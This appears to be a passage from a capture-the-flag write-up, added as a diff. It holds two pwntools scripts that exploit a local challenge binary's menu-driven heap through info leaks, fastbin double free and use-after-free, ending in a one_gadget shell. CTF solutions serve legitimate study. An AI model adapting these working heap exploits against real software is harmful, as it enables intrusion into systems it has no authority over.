@@ -1,0 +1,128 @@
+from pwn import *
+context.log_level='debug'
+context.arch='amd64'
+p=process("./pwn")
+sla 	= p.sendlineafter
+sa 		= p.sendafter
+ra 		= p.readuntil
+def cmd(c):
+    sla("> ",str(c))
+def add(size,c="A",t=1):
+	cmd(1)
+	sla("?\n",str(t))
+	sla("?\n",str(size))
+	sa("?\n",c)
+def edit(size,c):
+	cmd(2)
+	sla("?\n",str(size))
+	sa("?\n",c)
+def show(idx):
+    
+	cmd(3)
+	sla("?\n",str(idx))
+def free(idx):
+	cmd(4)
+	sla("?\n",str(idx))
+# -1 leak
+add(0x18)#0
+add(0x18)#1
+free(1)
+free(0)
+add(0)#2
+show(2)
+heap = u64(p.readline()[:-1]+'\0'*5)
+log.warning(hex(heap))
+
+# overlap
+add(0x18)#3
+add(0x18)#4
+add(0x18)#5
+
+# fengshui
+add(0x88,'\0'*0x70+flat([0,0x81]))#6
+add(0x18,'/bin/sh\0')#victim
+free(2)
+free(3)
+add(0x78)#8
+add(0x78)#9
+free(8)
+free(9)
+free(8)
+# fengshui 
+free(4)
+free(5)
+# heap overflow
+add(0x78,p64(heap+0x6031a0-0x603040))
+add(0x78)
+add(0x78)
+add(0x78,flat([0,0x132,0x4006e0]))
+#gdb.attach(p,'b *0x400a1d')
+show(7)
+p.interactive()
+```
+## Elegant Old-fashioned UAF
+Assume we have Full RELRO and not backdoor.
+This one matter little with One_gadget and could bypass seccomp.
+Use 1,3,4. Actually you could modify the script to avoid using 4. Too lazy to do that. 
+```python
+from pwn import *
+context.log_level='debug'
+context.arch='amd64'
+p=process("./pwn")
+sla 	= lambda a,b: p.sendlineafter(a,b)
+sa 		= lambda a,b: p.sendafter(a,b)
+ra 		= lambda a,b: p.readuntil(a,b)
+sl      = lambda a: p.sendline(a)
+def cmd(c):
+    sla("> ",str(c))
+    return 
+def add(size,c="A",t=1):
+	cmd(1)
+	sla("?\n",str(t))
+	sla("?\n",str(size))
+	sa("?\n",c)
+def num(n):
+    cmd(1)
+    sla("?\n",str(0))
+    sa("?\n",str(n))
+def edit(idx,c):
+	cmd(2)
+	sla("?\n",str(idx))
+	sl(str(c))
+def show(idx):
+	cmd(3)
+	sla("?\n",str(idx))
+def free(idx):
+	cmd(4)
+	sla("?\n",str(idx))
+idx = (0x6020c0-0x400540)//0x10
+show(-idx)
+base = int(p.readline()) - (0x7ffff7dd18e0-0x7ffff7a0d000)
+log.warning(hex(base))
+
+add(0x18)#0
+add(0x18)#1
+free(1)
+free(0)
+add(0)#2
+show(2)
+heap = u64(p.readline()[:-1]+'\0'*5)
+log.warning(hex(heap))
+
+
+pay = flat([0,0x60207a,0,0x6031a0-0x603040+heap,0,0x603230-0x603040+heap])
+add(0x100,pay)# 0x603098#3
+add(0x68,p64(0xdeadbeef))#4
+add(0x68,p64(0xcafebabe))#5
+idx = (heap+0x50-0x6020c0)//0x10
+free(idx+1)
+free(idx+2)
+free(idx+1)
+add(0x68,p64(0x7ffff7dd1aed-0x7ffff7a0d000+base))
+add(0x68)
+add(0x68)
+add(0x68,"\0"*3+p64(0xdeadbeef)*2+p64(base+0xf1247))
+gdb.attach(p,'b *0x40116A')
+cmd(1)
+p.sendlineafter("?\n","0")
+p.interactive()
